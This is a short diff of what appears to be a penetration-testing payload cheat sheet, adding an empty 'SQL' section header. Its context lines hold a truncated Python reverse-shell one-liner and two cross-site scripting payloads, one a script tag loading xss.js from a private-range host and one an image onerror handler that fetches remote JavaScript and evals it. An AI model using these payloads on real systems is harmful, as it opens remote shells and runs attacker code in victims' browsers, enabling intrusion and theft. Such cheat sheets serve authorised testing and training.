@@ -22,3 +22,8 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 <script src="http://192.168.45.5:9000/xss.js"></script>
 <img src='x' onerror='fetch("http://192.168.49.52:9000/xss.js").then(function(t){return t.text()}).then(function(v){eval(v)})'>
+
+----------------
+SQL
+----------------
+
